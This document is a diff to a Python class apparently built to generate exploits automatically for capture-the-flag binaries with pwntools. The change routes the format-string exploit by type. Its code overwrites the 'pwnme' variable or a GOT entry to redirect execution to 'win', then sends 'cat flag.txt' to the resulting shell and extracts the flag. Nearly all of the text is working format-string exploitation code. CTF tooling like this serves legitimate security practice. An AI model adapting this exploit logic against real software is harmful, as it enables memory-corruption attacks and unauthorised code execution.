@@ -99,13 +99,13 @@ class Raeg:
             if "pwnme" in self.elf.sym.keys():
                 logger.info("Found a format overwrite with the pwnme variable")
                 self.exploit_function = "pwnme"
-                ret = self.format_write(1337, self.elf.sym['pwnme'])
+                ret = self.format_write(1337, self.elf.sym['pwnme'], 'pwnme')
                 if ret == 1:
                     None
                 else:
                     for i in self.elf.got.keys():
                         try:
-                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                             if ret == 1:
                                 break
                         except:
@@ -116,7 +116,7 @@ class Raeg:
                 self.exploit_function = "win"
                 for i in self.elf.got.keys():
                     try:
-                        ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                        ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                         if ret == 1:
                             break
                     except:
@@ -662,7 +662,7 @@ class Raeg:
     #Accepts:
     #value (e.sym[] or int value to write)
     #addr (e.sym[] or e.got[] address to write to)
-    def format_write(self, value, addr):
+    def format_write(self, value, addr, exp_type):
         offset = 0
         #Find response from self.binary
         for i in range(1, 100):
@@ -711,19 +711,34 @@ class Raeg:
         #Send exploit
         p = process(self.binary)
         p.sendline(self.format_string)
-        p.sendline(b'cat flag.txt')
-        #Tries to recv all until timeout
-        try:
-            data = p.recvall(timeout=8)
-            if 'flag' in data.decode():
-                self.flag = "flag{" + data.decode().replace(" ", "").replace("\n", "").split("{")[1].split("}")[0] + "}"
-                p.close()
-                logger.info("First Controllable Offset Located at: " + str(offset))
-                logger.info(f"Sending Format String: {self.format_string}")
-                return 1
-        except:
-            log.warning("Receive Failed...")
-            return 0
+
+        if exp_type == 'pwnme':
+            try:
+                data =p.recvall(timeout=8)
+                if 'flag' in data.decode():
+                    self.flag = "flag{" + data.decode().replace(" ", "").replace("\n", "").split("{")[1].split("}")[0] + "}"
+                    p.close()
+                    logger.info("First Controllable Offset Located at: " + str(offset))
+                    logger.info(f"Sending Format String: {self.format_string}")
+                    return 1
+            except:
+                log.warning("Receive Failed...")
+                return 0
+
+        else:
+            p.sendline(b'cat flag.txt')
+            #Tries to recv all until timeout
+            try:
+                data = p.recvall(timeout=8)
+                if 'flag' in data.decode():
+                    self.flag = "flag{" + data.decode().replace(" ", "").replace("\n", "").split("{")[1].split("}")[0] + "}"
+                    p.close()
+                    logger.info("First Controllable Offset Located at: " + str(offset))
+                    logger.info(f"Sending Format String: {self.format_string}")
+                    return 1
+            except:
+                log.warning("Receive Failed...")
+                return 0
 
 
 
